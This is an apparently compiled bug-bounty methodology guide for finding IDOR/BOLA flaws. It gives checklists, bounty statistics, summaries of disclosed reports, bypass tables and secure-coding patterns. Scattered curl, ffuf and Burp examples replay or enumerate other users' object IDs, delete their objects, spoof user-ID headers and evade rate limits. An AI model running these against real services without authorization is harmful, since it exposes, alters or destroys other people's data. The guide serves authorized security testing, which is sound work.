# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Collect every identifier from responses, exports, emails, JS bundles, and mobile APIs.
- Replay the same request with a second account and with no auth; compare status, length, and body.
- Test list/search/export/batch endpoints, not only detail pages.
- Try nested resources: /org/1/user/2, /invoice/9/line/1, and composite IDs.
- Check file downloads and signed-URL generation for object substitution.

### Deeper checklist

- Collect every object identifier from responses, exports, emails, and JS bundles.
- Swap IDs across two accounts and across tenants; test sequential, UUID, and hashed IDs.
- Try ID formats: numeric +-1, UUID v1, base64, slug, composite keys, nested IDs.
- Check list, search, export, and batch endpoints, not just detail endpoints.
- Test file/download endpoints and signed URL generation for object substitution.
- Look for authorization based only on the parent object (nested resource IDOR).
- Confirm cross-account data access with a second controlled account.

### Step-by-Step Hunting Methodology

1. **Map all object references in the application**
   - Browse every feature authenticated as User A
   - Capture all requests in Burp Suite
   - Filter for requests containing: `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, query params with numeric/UUID values

2. **Enumerate ID types**
   - Sequential integers → enumerate ±1, ±100
   - UUIDs → check if they appear in other responses or JS files
   - Hashed IDs → check if leaked in public endpoints, metadata, or GraphQL introspection

3. **Create two separate accounts (same privilege level)**
   - User A: resource owner
   - User B: attacker account
   - Log all IDs belonging to User A while authenticated as User A

4. **Replay User A's resource IDs as User B**
   - Replace session cookie/token with User B's credentials
   - Send identical requests referencing User A's object IDs
   - Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE on each endpoint

5. **Test cross-tenant/cross-org scenarios**
   - Create accounts in separate organizations/businesses
   - Test if Org B's session can reference Org A's IDs
   - Pay special attention to admin/management endpoints

6. **Test GraphQL specifically**
   - Run introspection: `{ __schema { queryType { fields { name } } } }`
   - For every query/mutation taking an `id` argument, substitute another user's ID
   - Test both queries (read) and mutations (write/delete)

7. **Test write/destructive operations, not just reads**
   - Can User B DELETE User A's resources?
   - Can User B MODIFY User A's content?
   - Can User B ADD themselves to User A's account?

8. **Chain IDORs together**
   - Use one IDOR's leaked data (org IDs, user IDs) to fuel the next
   - IDOR → leaked ID → second IDOR → privilege escalation

9. **Test state-changing edge cases**
   - Expired tokens/invites that can still be accepted
   - Race conditions on resource IDs
   - Indirect references: `?sort=id` or `?filter[user_id]=`

10. **Document the exact differential**
    - Confirm User B has NO legitimate access to User A's resource
    - Screenshot/log the 200 OK vs expected 403/404

---

### Web-Research Methodology Additions (2026)

Sourced from OWASP API Security Top 10 (API1:2023 BOLA), the OWASP IDOR Prevention Cheat Sheet, a 2026 multi-account testing guide, and the Bugcrowd IDOR methodology (see D). Extends the chain library already in this skill with current discovery/validation discipline.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **OWASP's three ingredients:** an object, a reference to it (ID/UUID/account number/token/slug), and a missing object-level authorization check. Exposing an ID is not the bug; the missing check is. Tag as CWE-639 (child of CWE-863).
- **Where references hide (DeepStrike table):** URL path `/api/users/123/settings`; query `?account=88231`; JSON/form body `"order_id": 5520` or a hidden `<input name="user_id">`; **headers/cookies** `X-Account-Id`, `X-User-ID`, `X-UID`, account cookies; GraphQL `node(id:)` / mutation args; **nested resources** `/orders/77/items/3` (parent checked, child not); file/export names `/downloads/invoice-2026-0042.pdf`; async jobs `/reports/status?job=af31…`; **batch endpoints** `/api/bulk?ids=1,2,3` where each member of the list must be checked.
- **Four types to map (ACSC/CISA/NSA AA23-208A):** horizontal (peer's data), vertical (higher-privilege record), object-level (modify/delete someone else's object), function-level (invoke an action reserved for another role). The last two shade into BFLA.
- **Account setup:** at least two same-role accounts (A owner, B attacker), a user C in a second tenant for multi-tenant apps, one account per privileged role, plus an unauthenticated session. Create test objects for each so ownership ground truth is known.
- **Burp workflow (Bugcrowd):** browse every feature while proxying; use the HTTP History + scope "Show only in-scope items"; use a normal tab for user A and an incognito/secret tab for B so you never log yourself out. Mine `.html`/`.js` files for AJAX calls and endpoints the UI never links; check `archive.org` old JS bundles and dorks for retired endpoints.
- **Capture ALL requests, including secondary flows:** reported cases hid the IDOR in a second-purchase credit-card selection request and in `POST /messages/5955/invite` with `user=testaccount2` — the primary `/messages/5955` GET was correctly protected. Play every workflow to completion.
- **Tooling:** Burp `Autorize`, `AuthMatrix`, `Authorize`, `Authz`; `Wsdler`/SoapUI/Postman for WSDL/Swagger APIs; `ffuf` for ID enumeration; `mitmproxy` for scripted replay. Turn the role matrix into CI tests (OWASP Authorization Testing Automation Cheat Sheet).
- **Classic real cases worth modelling:** First American Financial (sequential document number → 800M+ records, SEC penalty); CVE-2026-55255 Langflow (UUID flow ID still IDOR'd, CISA KEV — UUIDs are NOT a fix); CVE-2021-36539 Canvas (file *preview* URL lacked the check); CVE-2017-11357 Telerik (IDOR → file upload → RCE).

### Part 5 — Methodology (step by step)

1. **Map all object references** in the application. Browse every feature as User A, capture all requests in Burp, filter for `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, and query params with numeric/UUID values.
2. **Enumerate ID types** (§1.2) — sequential, UUIDv1/v4, base64, Hashids, composite, GID.
3. **Create two separate accounts at the same privilege level.** User A = resource owner; User B = attacker. Log all IDs belonging to A while authenticated as A.
4. **Replay A's resource IDs as B.** Replace session cookie/token with B's credentials, send identical requests referencing A's object IDs. Test all HTTP verbs on each endpoint.
5. **Test cross-tenant / cross-org scenarios.** Create accounts in separate organizations and test whether Org B's session can reference Org A's IDs — especially admin/management endpoints.
6. **Test GraphQL specifically** (§4) — introspection, `node(id:)`, field-level IDOR, aliases, mutations.
7. **Test write / destructive operations, not just reads.** Can B delete A's resources? Modify A's content? Add themselves to A's account?
8. **Chain IDORs together.** One IDOR's leaked data (org IDs, user IDs) fuels the next → privilege escalation.
9. **Test state-changing edge cases.** Expired tokens/invites that can still be accepted; race conditions; indirect refs (`?sort=id`, `?filter[user_id]=`).
10. **Document the exact differential.** Confirm B has no legitimate access to A's resource; screenshot the 200 OK vs expected 403/404.

Then run the pre-report gate (above) and, if chaining, Part 6.

---

## Signals and surfaces

### Signal

- Reports: **450** · paid: **107**
- Median bounty **$500** · p90 **$5,000** · max **$20,000** · total **$199,099**
- Median upvotes **31**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`id` `user_id` `account_id` `org_id` `team_id` `order_id` `invoice_id` `file_id` `message_id` `project_id` `tenant` `uuid`

### Crown Jewel Targets

**Why IDOR pays big:**
- Direct access to other users' data without authentication bypass — clear, demonstrable impact
- Chains easily with privilege escalation, financial fraud, and account takeover
- Affects virtually every application with user-owned resources

**Highest-value asset types (by payout potential):**

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |

**Programs that pay most for IDOR:**
- Platforms with multi-tenancy (SaaS, B2B tools)
- Fintech and payment processors
- Social platforms with private content
- Developer tools with org/repo isolation

---

### Attack Surface Signals

**URL patterns that scream IDOR:**
```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**Response header signals:**
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources

**JavaScript source patterns:**
```javascript
// Look for hardcoded or interpolated IDs in JS
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

**Tech stack signals:**
- GraphQL endpoints (query-based IDORs are often missed)
- REST APIs with sequential integer IDs (most vulnerable)
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
- Mobile apps (Burp the APK — mobile APIs often skip authorization checks)

---

### Where it pays (450-report corpus)

| Program | Reports | Bounty | Upvotes |
|---|---:|---:|---:|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

### 1.4 Response / header signals

- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources
- `Location` headers, error messages, or metadata that leak internal IDs

### 1.5 Tech-stack signals

- GraphQL endpoints — query-based IDORs are often missed (§4)
- REST APIs with sequential integer IDs — most vulnerable
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS with `org_id`, `account_id`, `business_id` params
- Mobile apps — Burp the APK; mobile APIs often skip authorization checks
- Legacy / v0 / internal endpoints — mine JS bundles and Wayback for `/internal/`, `/v0/`, `/legacy/` siblings of protected routes (§3.4)

---

## Techniques, payloads and bypasses

### Payloads & probes

- Numeric -> id=1 -> id=2, id=0, id=-1, id=999999
- UUID/hash -> swap a known UUID from another account; try UUIDv1 timestamps.
- Encoded -> base64 decode/encode, hex, JWT sub, gid://app/Model/123
- Batch -> `{"ids":[1,2,3]}` or repeated `id=1&id=2`
- Nested -> `/users/1/orders/2` with user 1 but order 2

### Bypass tricks

- Swap GET/POST/PUT/PATCH/DELETE; try method override headers and `_method`.
- Move the ID from body to query, path, or header; try JSON arrays and duplicate keys.
- Test hidden fields and mass assignment on owner/org/role/account fields.
- GraphQL: query other users' nodes, aliases, and nested connections directly.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Delete anyone's content spotlight remotely.** — `#1819832` · Snapchat · $15,000 · ▲801
  > {"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT STORY"},"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!) {\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}
- **IDOR allows user to access report details via reference.json endpoint** — `#3862641` · HackerOne · $15,000 · ▲372
  > By sending a POST request to the `/reports/{report id}/reference.json` endpoint with an empty JSON body `{}`, VDP users could retrieve information about private reports belonging to other programs despite receiving an access-denied error.
- **Insecure Direct Object Reference (IDOR) - Delete Campaigns** — `#1969141` · HackerOne · $0 · ▲346
  > At the campaign id parameter in the request change it to another program's ongoing campaign id parameter.
- **Attachment disclosure via summary report** — `#2442008` · HackerOne · $0 · ▲340
  > or in gdrive, if yt can't be seen yet : https://███████
- **Arbitrary Read of Another Users private repository without Authorization** — `#3124517` · GitHub · $10,000 · ▲276
  > [CVE-2025-8447](https://www.cve.org/cverecord?id=CVE-2025-8447)
- **Deleting all DMs on RedditGifts.com** — `#1213237` · Reddit · $5,000 · ▲267
  > Change cookies/csrf token and `4423007` to your own message ID
- **Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint** — `#2487889` · HackerOne · $0 · ▲266
  > idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity rating`,`readable substate`,`created at`,`submitted at`,`reporter name`
- **Singapore - Account Takeover via IDOR** — `#876300` · Starbucks · $0 · ▲260
  > ko2sec discovered that an alternate site shared database and cookie credentials with card.starbucks.com.sg.
- **Steal private objects of other projects via project import** — `#743953` · GitLab · $20,000 · ▲254
  > Many attributes (foreign key) like `issue ids` and `merge request ids` are not excluded during import.
- **IDOR: Account Deletion via Session Misbinding – Attacker Can Delete Victim Account** — `#3154983` · Mozilla · $0 · ▲244
  > A critical vulnerability in the Firefox Accounts API allows an authenticated attacker to permanently delete any user's account by sending a `POST /v1/account/destroy` request using attacker session, but including the victim’s `email` and `authPW` (password…
- **Insecure redirect rule results in bypassing ban redirect on certain pages** — `#703058` · Roblox · $0 · ▲233
  > This allows us to access any pages ending in `.aspx/.ashx` without a ban-redirect, just by appending `/membership/` after the extension.
- **An IDOR that can lead to enumeration of a user and disclosure of email and phone number within cashier** — `#1966006` · Unikrn · $0 · ▲232
  > It was during the https://cashier.unikrn.com/cashier/transaction-history session handshake where we found out you could actually get access to another customer's data.
- **IDOR delete any Tickets on ads.tiktok.com** — `#1475520` · TikTok · $0 · ▲216
  > An IDOR (Insecure Direct Object Reference) vulnerability was found on TikTok ads, through the "draft order id" parameter which could have allowed an attacker to delete the support tickets of other users.
- **I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)** — `#391092` · Yelp · $0 · ▲214
  > @hk755a found an Insecure Direct Object Reference (IDOR) Vulnerability that allowed an attacker to pay with someone else's registered credit card, while ordering food with Grubhub through the `/checkout/transaction platform` endpoint.
- **IDOR vulnerability in unreleased HackerOne Copilot feature** — `#2218334` · HackerOne · $0 · ▲210
  > After creating a new conversation, look for `"operationName":"NewConversation",` graphql request in your `Proxy History` and store somewhere the value of `data.newConversation.llm conversation.id` from the response.
- **IDOR allows an attacker to modify the links of any user** — `#1661113` · Reddit · $0 · ▲208
  > - In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:
- **IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal** — `#915114` · Automattic · $0 · ▲202
  > If you click `Edit` button on any user of your team at https://app.crowdsignal.com/users/list-users.php, you will send a GET request to `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1`
- **IDOR on GraphQL queries BillingDocumentDownload and BillDetails** — `#2207248` · Shopify · $5,000 · ▲187
  > An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████:
- **IDOR Vulnerability at AddTagToAssets operation name** — `#2633771` · HackerOne · $0 · ▲178
  > You will obtain a request whose the operationName: `AddTagToAssets` and contains `tagId` parameter which has a base64 cipher text within
- **IDOR leads to Edit Anyone's Blogs / Websites** — `#974222` · Automattic · $0 · ▲177
  > Go to `https://www.intensedebate.com/edit-user-profile`, again and click `Save Settings` button open burp suite and change `hidBlogID` parameter with victim's `hidBlogID`.
- **Unauthorized Access to TikTok Account [Private Videos] via API Endpoint** — `#2868084` · TikTok · $0 · ▲167
  > A vulnerability on a TikTok endpoint was found that could have resulted in unauthorized viewing of videos from private accounts.
- **Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability** — `#1658418` · Reddit · $5,000 · ▲163
  > + If it's true then there are more logs and we can get them by just adding new variable after and assigning value of endCursor , which we can see in the reponse body of our request {F1851533}
- **Unreleased CTF Levels are Revealed on /group/user/ID1?user=USERID endpoint** — `#536853` · HackerOne · $0 · ▲161
  > However, an IDOR at the https://ctf.hacker101.com/group/user/ID1?user=USERID endpoint reveals them (see attached screenshot)
- **Email change or personal data change on the account.** — `#1250037` · Stripe · $3,000 · ▲149
  > @dk82hg found the email change flow on indiehackers.com was vulnerable to an insecure direct object reference (IDOR) which allowed an attacker to change the email associated with a user account to one they owned and ultimately take over a victim’s account in…
- **Disclose Hidden Comments on Media Section of hub.vroid.com** — `#2541962` · pixiv · $500 · ▲149
  > From UserAttacker, intercept any POST request made to https://hub.vroid.com/ and send it to the repeater
- **Importing GitLab project archives can replace uploads of other users** — `#534794` · GitLab · $0 · ▲148
  > Note that the request was for the `/root/new project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` file, however the file from the `test/modified project` was served.
- **IDOR vulnerability (Price manipulation)** — `#1403176` · Acronis · $0 · ▲146
  > 2.buy any product in this case i am going to buy this https://www.acronis.cz/produkt/acronis-cyber-protect-home-office/ for test
- **Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil** — `#2950536` · U.S. Dept Of Defense · $0 · ▲142
  > These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
- **Missing ownership check on remote wipe endpoint** — `#819807` · Nextcloud · $500 · ▲141
  > Forward with burpsuite and in the url that looks like settings/personal/authtokens/wipe/{data-id}, change the data-id to the id of the device of the victim
- **IDOR and statistics leakage in Orders** — `#544329` · X / xAI · $289 · ▲141
  > Twitter on its service "MoPub" statistics dedicated to the results of "Order", after the test shows that the endpoint "https://app.mopub.com/web-client/api/orders/stats/query" is infected with a "IDOR " bug

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `MembershipRequest::getMembership()` |
| 4× | `link()` |
| 3× | `victim@email.com` |
| 3× | `MembershipService::getMembership()` |
| 2× | `Move to > My Content` |
| 2× | `application%5Bid%5D` |
| 2× | `curl --request POST \ / --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&extern` |
| 2× | `/BugReport/Admin/Attachment/{id}` |
| 2× | `attacker@email.com` |
| 2× | `{attacker-email}` |
| 2× | `curl -X GET "http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl" \ / -H "OCS` |
| 2× | `getMembership()` |
| 2× | `LocalController::link()` |
| 1× | `POST /reports/[TEST_REPORT_ID]/reference.json HTTP/2 / Host: hackerone.com / Cookie: [your session cookie] / Content-Type: application/json` |
| 1× | `/reports/{id}/reference.json` |
| 1× | `/reports/{report_id}/reference.json` |
| 1× | `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1` |
| 1× | `<PUT_VICTIM_EMAIL_HERE>` |
| 1× | `exmaple: GET /api/v1/users/@hasn0xxxx` |
| 1× | `GET /attachments/938540538 HTTP/1.1 / X-Signal-Agent: OWA / Accept-Encoding: gzip, deflate / X-Client-Version: BCM Android/5.1 Model/generic` |

### Common Root Causes

1. **Missing ownership check in ORM queries**
   ```javascript
   // VULNERABLE: fetches any record
   const invoice = await Invoice.findById(req.params.id);
   
   // SECURE: scopes to authenticated user
   const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
   ```

2. **Authorization at the route level, not object level**
   - Developer checks "is user logged in?" but not "does this user own this object?"
   - Middleware confirms authentication; individual handlers skip ownership validation

3. **Trusting client-supplied IDs in request bodies**
   - Mobile apps or SPAs send `org_id` in POST body; server uses it directly without verifying caller belongs to that org

4. **GraphQL resolvers without field-level authorization**
   - Query resolvers fetch by ID from database without checking if the requesting user has permission
   - Especially common when resolvers are auto-generated from schema

5. **Inconsistent authorization across HTTP verbs**
   - GET endpoint is protected; POST/DELETE on same resource path is not
   - Common in APIs built incrementally by different developers

6. **Indirect references exposed via related objects**
   - Object A (accessible) contains a reference to Object B (should be private)
   - Developer only protects direct access to B, not indirect references through A

7. **Race conditions and state-based IDORs**
   - Authorization checked at creation time, not at access time
   - Invites/tokens remain valid after the granting permission is revoked

8. **Multi-tenant isolation failures**
   - Developers implement per-user access control but forget cross-org boundaries
   - `user_id` check present; `org_id` / `tenant_id` check absent

---

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `account-takeover` — Chain 1, 5
- `xss` — Chain 2
- `graphql` — Chains 3, 4
- `misc` — Chain 5
- `logic-and-design` — Chain 6

---

### B. Techniques & bypasses — specific actionable techniques and payload shapes, not generic advice

- **Direct substitution:** `GET /api/invoices/1001` (Alice) → `GET /api/invoices/1002` with B's cookie. If 200 + Bob's data, it is IDOR. Body variant: `PATCH /api/profile {"user_id":4471,"email":"attacker@evil"}` → ATO via password reset if the server trusts the client `user_id`.

Minimum replay set for one object (as attacker B):
```
GET    /api/invoices/1002            -> read Bob's invoice
PATCH  /api/invoices/1002  {"status":"paid"}   -> write to Bob's object
DELETE /api/invoices/1002            -> destroy Bob's object
POST   /api/bulk?ids=1001,1002       -> check EVERY id in the batch
GET    /orders/77/items/3            -> check child through parent too
POST   /graphql  {"query":"mutation { deleteReports(reportKeys:[\"<DOC_ID>\"]) }"}
```
- **HTTP Parameter Pollution (HPP):** duplicate the parameter — `?id=own&id=victim` and `/api/bulk?ids=own&ids=victim` — exploitable when the first value passes the check and a framework (Express/PHP/Django multi-value) uses the last. Also try nested JSON wrappers `{"data":{"id":"VICTIM"}}` and name variants `uid` / `userId` / `user_id` / `account`.
- **Encoded / hashed references:** decode Base64/hex IDs, increment the numeric part, re-encode. If the ID is hashed, look for the hash leaked in the page source, a `Referer` header, an in-app message, or another API response — then replay it with B's session. Cross-reference `security-arsenal` IDOR bypass tables.
- **Create-request manipulation:** when the client generates IDs, send `id=-1`, `id=0`, or an existing ID on create — several apps then let you edit/delete another user's object. If no `id` param appears on create, add one using the key name observed on the edit/delete request.
- **Forge a *valid* request:** when replaying A's request as B, replace the CSRF token with B's, keep the XHR `Content-Type`, and preserve custom headers (`W-User-Id`, `X-User-Id`, `User-Token`, `X-CSRF-Token`). A token mismatch produces a misleading error and a false negative.
- **Method / version / path fan-out:** if GET is protected, test `PUT`, `PATCH`, `DELETE` on the same object; try older `/v1/` routes, alternate hostnames, nested children, export/preview endpoints, and batch IDs. The Canvas case shows preview/export paths are routinely missed.
- **Blind IDOR:** a state change may be observable only out-of-band — e.g. editing another user's object triggers an email containing its details. Watch the out-of-band channel, not just the HTTP response.
- **Header-driven impersonation:** in test/debug deployments `X-User-ID`, `X-UID`, `W-User-Id` may be trusted — swap them to act as another user. Combine with password-reset / password-change / account-recovery requests where a leaked `user_id` yields ATO.
- **Amplification:** chain a low-impact IDOR with self-XSS into "IDOR + stored XSS" (P2), or with mass assignment (`role=OWNER`) into cross-tenant privilege escalation. See the Chain 1–6 library above.
- **GraphQL per-resolver gap:** introspect `__schema`, then test each query/mutation accepting an `id:` argument independently — one resolver may check ownership while a sibling (e.g. a nested relation or a delete mutation) does not. OWASP's scenario #3 is exactly a `deleteReports(reportKeys:[<DOCUMENT_ID>])` mutation with no permission check.
- **Indirect reference maps:** when raw IDs are replaced by per-user "1, 2, 3" indexes or opaque tokens, still supply another user's index/token — the map must be scoped to the session. If translation is global, the obfuscation provides no protection.
- **Temporal / post-removal IDOR:** capture a session or PAT, have the owner remove you, then replay the token — authorization checked at creation but not at access time is a known persistence variant (see Chain 5 above).
- **Secure-lookup contrasts that tell you what to probe (OWASP):** `Project.find(params[:id])` / `findById(id)` = global lookup (vulnerable); `@current_user.projects.find(params[:id])` / `findByIdAndOwnerId(id, currentUser().getId())` = scoped (safe). If the target uses global lookup anywhere, every endpoint using it is a candidate.

### 2.10 Payload fragments observed (from 450-report corpus)

Recurring fragments from writeups. Adapt, don't paste blindly.

```
MembershipRequest::getMembership()
link()
victim@email.com
MembershipService::getMembership()
Move to > My Content
application%5Bid%5D
/BugReport/Admin/Attachment/{id}
attacker@email.com
getMembership()
LocalController::link()
<PUT_VICTIM_EMAIL_HERE>
exmaple: GET /api/v1/users/@hasn0xxxx
```

### 3.15 Bypass-vs-defense table

| Defense | Bypass |
|---|---|
| UUIDs instead of sequential integers | Harvest UUIDs from other responses, emails, webhooks, JS, GraphQL introspection; replay against restricted endpoints |
| Indirect / hashed object references | Decode the hash (often base64); find the original ID in another response (`echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`) |
| Short-lived per-resource tokens | Test whether the token is actually bound to the object or only validated for format — reuse your own token against a victim ID |
| Rate limiting on enumeration | Slow enumeration (1 req / 5 s), distributed IPs, or use non-enumeration IDORs (you already know the target's ID from another leak) |
| `user_id` check in WHERE clause | Test the same endpoint on a different API version (`/v1/` vs `/v2/`); check JS bundles for older version calls |
| CORS restrictions | IDOR doesn't require cross-origin exploitation — you test API endpoints directly with your own session |
| "Opaque" server-side references | Look for any endpoint that returns the internal ID (Location headers, error messages, metadata), then use it elsewhere |
| WAF / parameter filtering on `id` | Nested JSON `{"data":{"id":"VICTIM"}}`, HPP `?id=own&id=victim`, parameter-name variations (`user_id`, `userId`, `uid`, `account`) |

---

### 4.7 Persisted-query / allowlist bypass

Some GraphQL deployments only enforce an operation allowlist on *named* persisted queries sent by hash/ID; the same schema often still accepts raw, non-persisted queries on the same endpoint if the allowlist check is implemented as a pre-filter rather than a hard gate. Test sending the full raw query text instead of the persisted-query hash — if it's accepted, the entire schema is reachable regardless of what's on the allowlist.

---

### Part 8 — Root causes → secure-code patterns

| # | Root cause | Vulnerable pattern | Secure pattern |
|---|---|---|---|
| 1 | Missing ownership check in ORM query | `Invoice.findById(req.params.id)` | `Invoice.findOne({ _id: req.params.id, userId: req.user.id })` |
| 2 | Authz at route level, not object level | Middleware checks "logged in?"; handler never checks "owns this object?" | Per-object ownership check in the resolver/service, not just middleware |
| 3 | Trusting client-supplied IDs in bodies | Server uses `org_id` from POST body without verifying caller belongs to that org | Derive `org_id` from the authenticated session; reject conflicting body values |
| 4 | GraphQL resolvers without field-level authz | Auto-generated resolvers fetch by ID without permission check | Field-level authz on every relation, especially `node(id:)` and nested connections |
| 5 | Inconsistent authz across HTTP verbs | GET protected; POST/DELETE on the same path is not | Centralize authz in the service layer so every verb passes through it |
| 6 | Indirect references exposed via related objects | Object A (accessible) references Object B (private); only B's direct route is protected | Treat every serialized ID as a potential object reference; authz on resolution, not on route |
| 7 | Race / state-based IDOR | Authz checked at creation, not at access | Re-check authz at every state transition; invalidate tokens on permission revocation |
| 8 | Multi-tenant isolation failure | `user_id` check present; `org_id`/`tenant_id` check absent | Always scope by both user and tenant; test cross-tenant explicitly |
| 9 | Signed-URL step skips object authz | Signing endpoint accepts any object ID and mints a URL | Authz the object before signing; bind the signed URL to the session where possible |
| 10 | Soft-delete without token revocation | `active=false` but session/PAT still valid | Revoke sessions/PATs on removal; re-check policy at every request |

---

### Part 10 — Additional bypass techniques (general knowledge, not corpus-sourced)

These are established IDOR/BOLA testing techniques worth adding to the arsenal. They are **not drawn from a fresh search of public write-ups** — this environment currently has web search off, so treat the CVE/report-backed sections above as the sourced material and this part as general tradecraft to try, not as citation-backed findings. Enable web search if you want this section refreshed against the latest disclosed reports and advisories.

### 10.1 Content-negotiation bypass

Some frameworks bind authz middleware to a specific route/format and skip it for alternate representations of the same resource:

```
GET /api/users/123          -> 403 (authz middleware attached)
GET /api/users/123.json     -> 200 (format suffix routes around the middleware)
GET /api/users/123.xml      -> 200
Accept: application/vnd.api+json   (vs. the default Accept the UI sends)
```

Always try the same object ID across every content-type/extension variant the API supports, not just the one the front-end uses.

### 10.2 `X-Original-URL` / `X-Rewrite-URL` rewrite-header bypass

Reverse proxies and some frameworks (notably older Spring/Symfony setups behind certain gateways) trust `X-Original-URL` or `X-Rewrite-URL` to decide the "real" path for authz purposes, while the actual handler routes on the request-line path. Send a request to an unauthenticated-looking path with the protected path in the header, or vice versa, and compare authz outcomes.

### Payload & Detection Patterns

**Basic IDOR test with curl (swap cookie/token):**
```bash
# Get User A's resource ID while authenticated as A
curl -s -H "Cookie: session=USER_A_SESSION" \
  https://target.com/api/v1/invoices/12345

# Replay with User B's session
curl -s -H "Cookie: session=USER_B_SESSION" \
  https://target.com/api/v1/invoices/12345

# Success = 200 OK with User A's data
```

**GraphQL IDOR test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```

**Enumerate sequential IDs with ffuf:**
```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 \
  -o idor_results.json
```

**Generate sequential ID wordlist:**
```python
# Generate IDs around a known value
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
```

**Burp Intruder payload for IDOR scanning:**
```
GET /api/messages/§12345§ HTTP/1.1
Host: target.com
Authorization: Bearer USER_B_TOKEN

# Mark §12345§ as injection point
# Use numeric sequential payload: 12000-13000
# Filter responses by length difference or status 200
```

**JavaScript scraping for leaked IDs:**
```bash
# Find IDs in JS bundles
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

# Find object references in API responses
curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

**Grep patterns for source code review:**
```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Look for direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# vs secure pattern: Model.find({ id: params.id, userId: req.user.id })
```

**IDOR via HTTP method tampering:**
```bash
